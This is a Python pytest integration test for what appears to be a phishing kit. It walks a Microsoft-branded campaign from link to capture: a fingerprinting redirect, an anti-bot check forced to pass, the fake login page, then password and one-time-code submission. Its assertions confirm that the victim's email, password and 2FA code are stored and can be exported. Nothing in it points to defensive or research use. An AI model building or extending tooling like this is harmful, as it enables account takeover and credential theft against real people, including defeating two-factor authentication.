import pytest
from fastapi.testclient import TestClient
from unittest.mock import MagicMock, patch, AsyncMock
import json
import os

# Mock Redis before importing app components
with patch("core.cache.redis_manager.redis_cache") as mock_redis_cache:
    # Setup mock behavior
    storage = {}
    
    def set_side_effect(key, value, expire=None):
        if isinstance(value, (dict, list)):
            storage[key] = json.dumps(value)
        else:
            storage[key] = value
        return True
        
    def get_side_effect(key):
        val = storage.get(key)
        if val and isinstance(val, str):
            try:
                return json.loads(val)
            except json.JSONDecodeError:
                return val
        return val

    mock_redis_cache.set.side_effect = set_side_effect
    mock_redis_cache.get.side_effect = get_side_effect
    mock_redis_cache.delete.side_effect = lambda k: storage.pop(k, None)
    
    # Import app after mocking
    from core.web.server import create_app
    from core.social.manager import social_manager
    from core.redirect.smart_redirector import smart_redirector
    from core.session.session_manager import session_manager

@pytest.fixture
def client():
    # Patch dependencies globally for the test session
    with patch("core.cache.redis_manager.redis_cache.set") as mock_set, \
         patch("core.cache.redis_manager.redis_cache.get") as mock_get, \
         patch("core.cache.redis_manager.redis_cache.delete") as mock_delete, \
         patch("core.redirect.antibot.antibot.check_request", new_callable=AsyncMock) as mock_antibot:
        
        # Setup in-memory Redis storage
        storage = {}
        
        def set_impl(key, value, expire=None, **kwargs):
            # Serialize complex types like in real Redis
            if isinstance(value, (dict, list)):
                storage[key] = json.dumps(value)
            else:
                storage[key] = value
            return True
            
        def get_impl(key):
            val = storage.get(key)
            if val and isinstance(val, str):
                try:
                    return json.loads(val)
                except:
                    return val
            return val
            
        mock_set.side_effect = set_impl
        mock_get.side_effect = get_impl
        mock_delete.side_effect = lambda k: storage.pop(k, None)
        
        # Antibot always allows
        mock_antibot.return_value = {"blocked": False}
        
        app = create_app()
        with TestClient(app) as test_client:
            yield test_client

def test_full_phishing_flow(client):
    """
    Test a complete phishing campaign flow:
    1. Create Campaign (Microsoft)
    2. Redirect (Fingerprinting)
    3. Verify Fingerprint
    4. Serve Phishing Page
    5. Submit Credentials (Login)
    6. Submit OTP (2FA)
    7. Verify Capture
    """
    
    # 1. Create Campaign
    # ==================
    response = client.post(
            "/v5/campaigns/create",
            data={
                "name": "Flow Test Campaign",
                "template_id": "microsoft",
                "target_email": "ceo@victim.com",
                "campaign_type": "template"
            }
        )
    assert response.status_code == 200
    campaign_data = response.json()
    assert campaign_data["status"] == "success"
    campaign_id = campaign_data["campaign"]["id"]
    
    # Ensure the campaign type is correctly stored/returned
    assert campaign_data["campaign"]["type"] == "template"
    print(f"\n[1] Campaign Created: {campaign_id} (Type: {campaign_data['campaign']['type']})")

    # 2. Access Redirect URL
    # ======================
    # Simulate a user visiting the link
    response = client.get(f"/v5/r/{campaign_id}", headers={"User-Agent": "Mozilla/5.0"})
    assert response.status_code == 200
    content = response.text
    
    # Extract session_id from meta tag
    import re
    sid_match = re.search(r'name="session-id" content="([^"]+)"', content)
    assert sid_match is not None
    session_id = sid_match.group(1)
    print(f"[2] Redirect Page Loaded. Session ID: {session_id}")
    
    # 3. Verify Fingerprint
    # =====================
    # Simulate JS sending fingerprint
    fingerprint = {
        "user_agent": "Mozilla/5.0",
        "screen_width": 1920,
        "screen_height": 1080,
        "color_depth": 24,
        "platform": "Win32",
        "language": "en-US",
        "timezone_offset": 0,
        "webgl_vendor": "Google Inc.",
        "webgl_renderer": "ANGLE",
        "canvas_hash": "123456",
        "fonts_detected": ["Arial"]
    }
    
    response = client.post(
        "/v5/verify_fingerprint",
        json={
            "campaign_id": campaign_id,
            "session_id": session_id,
            "fingerprint": fingerprint
        }
    )
    assert response.status_code == 200
    data = response.json()
    
    # Since this is a template campaign, expect redirection to phishing page
    expected_redirect = f"/v5/phish/{campaign_id}/login?sid={session_id}"
    assert data["redirect_to"] == expected_redirect
    print(f"[3] Fingerprint Verified. Redirecting to: {data['redirect_to']}")

    # 4. Access Phishing Page
    # =======================
    response = client.get(expected_redirect)
    assert response.status_code == 200
    page_content = response.text
    
    # Verify Phantasm config injection
    assert f"sessionId: '{session_id}'" in page_content
    assert f"campaignId: '{campaign_id}'" in page_content
    assert "apiEndpoint: '/v5/auth/login'" in page_content
    print("[4] Phishing Page Loaded and Verified")

    # 5. Submit Credentials (Step 1: Password)
    # ========================================
    # Simulate Phantasm sending credentials
    creds_payload = {
        "email": "ceo@victim.com",
        "password": "SuperSecretPassword123",
        "sid": session_id,
        "cid": campaign_id
    }
    
    response = client.post(
        "/v5/auth/login",
        json=creds_payload,
        headers={"Content-Type": "application/json"}
    )
    assert response.status_code == 200
    data = response.json()
    
    # Expect 2FA requirement (since we sent password but no OTP)
    assert data["status"] == "2fa_required"
    print("[5] Credentials Submitted. 2FA Required.")
    
    # Verify capture in session
    # We need to access the session manager directly or via export endpoint
    # Let's use the export endpoint if available
    
    # 6. Submit OTP (Step 2: 2FA)
    # ===========================
    otp_payload = {
        "otp": "123456",
        "sid": session_id,
        "cid": campaign_id
    }
    
    response = client.post(
        "/v5/auth/login",
        json=otp_payload,
        headers={"Content-Type": "application/json"}
    )
    assert response.status_code == 200
    data = response.json()
    
    assert data["status"] == "success"
    assert "redirect" in data
    print(f"[6] OTP Submitted. Success. Redirect: {data['redirect']}")

    # 7. Verify Data Capture
    # ======================
    # Check session export
    response = client.get(f"/v5/session/{session_id}/export")
    assert response.status_code == 200
    export_data = response.json()
    
    captured = export_data["credentials"]
    assert captured["email"] == "ceo@victim.com"
    assert captured["password"] == "SuperSecretPassword123"
    assert captured["otp"] == "123456"
    print("[7] All Data Captured Successfully!")
